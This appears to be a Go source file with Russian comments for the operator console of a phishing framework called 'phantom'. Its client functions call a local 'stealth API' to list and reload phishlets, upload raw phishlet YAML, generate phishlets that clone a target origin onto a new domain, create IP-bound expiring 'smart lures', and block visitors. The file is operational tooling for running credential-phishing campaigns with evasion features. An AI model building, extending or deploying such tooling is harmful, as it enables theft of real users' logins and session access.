// Package menu — консольное TUI оператора (charm/bubbletea).
// `phantom -menu`: dashboard, фишлеты, smart-lures, блокировки,
// reload/upsert/generate — поверх stealth API + локальный validate/gen.
package menu

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// Client — stealth API клиент для меню.
type Client struct {
	Base    string // http://127.0.0.1:8080
	Stealth string
	Token   string
	HTTP    *http.Client
}

func (c *Client) http() *http.Client {
	if c.HTTP != nil {
		return c.HTTP
	}
	return &http.Client{Timeout: 15 * time.Second}
}

func (c *Client) req(method, path string, body io.Reader) (*http.Request, error) {
	r, err := http.NewRequest(method, strings.TrimSuffix(c.Base, "/")+path, body)
	if err != nil {
		return nil, err
	}
	r.Header.Set("X-Stealth-Host", c.Stealth)
	if c.Token != "" {
		r.Header.Set("Authorization", "Bearer "+c.Token)
	}
	return r, nil
}

func (c *Client) doJSON(method, path string, body io.Reader, out any) (int, error) {
	r, err := c.req(method, path, body)
	if err != nil {
		return 0, err
	}
	resp, err := c.http().Do(r)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		return resp.StatusCode, fmt.Errorf("api %d: %s", resp.StatusCode, string(b))
	}
	if out != nil {
		if err := json.NewDecoder(resp.Body).Decode(out); err != nil {
			return resp.StatusCode, err
		}
	}
	return resp.StatusCode, nil
}

// Stats — /api/v1/stats.
func (c *Client) Stats() (map[string]any, error) {
	var out map[string]any
	_, err := c.doJSON(http.MethodGet, "/api/v1/stats", nil, &out)
	return out, err
}

// Phishlets — /api/v1/phishlets.
func (c *Client) Phishlets() ([]string, error) {
	var out []string
	_, err := c.doJSON(http.MethodGet, "/api/v1/phishlets", nil, &out)
	return out, err
}

// Block — /api/v1/block.
func (c *Client) Block(key, reason string) error {
	b, _ := json.Marshal(map[string]string{"key": key, "reason": reason})
	code, err := c.doJSON(http.MethodPost, "/api/v1/block", strings.NewReader(string(b)), nil)
	if err != nil {
		return err
	}
	if code != http.StatusNoContent {
		return fmt.Errorf("block: status %d", code)
	}
	return nil
}

// SmartLure — /api/v1/lures.
func (c *Client) SmartLure(path, phishlet string, ttlMin, maxUses int, boundIP string, challenge bool) error {
	b, _ := json.Marshal(map[string]any{
		"path": path, "phishlet_id": phishlet, "ttl_min": ttlMin,
		"max_uses": maxUses, "bound_ip": boundIP, "require_challenge": challenge,
	})
	code, err := c.doJSON(http.MethodPost, "/api/v1/lures", strings.NewReader(string(b)), nil)
	if err != nil {
		return err
	}
	if code != http.StatusCreated {
		return fmt.Errorf("lure: status %d", code)
	}
	return nil
}

// Reload — /api/v1/phishlets/reload.
func (c *Client) Reload() error {
	code, err := c.doJSON(http.MethodPost, "/api/v1/phishlets/reload", nil, nil)
	if err != nil {
		return err
	}
	if code != http.StatusNoContent {
		return fmt.Errorf("reload: status %d", code)
	}
	return nil
}

// Upsert — /api/v1/phishlets (raw YAML).
func (c *Client) Upsert(yml string) (string, error) {
	r, err := c.req(http.MethodPost, "/api/v1/phishlets", strings.NewReader(yml))
	if err != nil {
		return "", err
	}
	r.Header.Set("Content-Type", "text/yaml")
	resp, err := c.http().Do(r)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("upsert %d: %s", resp.StatusCode, string(b))
	}
	return string(b), nil
}

// Generate — /api/v1/phishlets/generate.
func (c *Client) Generate(origin, domain, id string) (string, error) {
	b, _ := json.Marshal(map[string]string{"origin": origin, "domain": domain, "id": id})
	r, err := c.req(http.MethodPost, "/api/v1/phishlets/generate", strings.NewReader(string(b)))
	if err != nil {
		return "", err
	}
	resp, err := c.http().Do(r)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	out, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("generate %d: %s", resp.StatusCode, string(out))
	}
	return string(out), nil
}
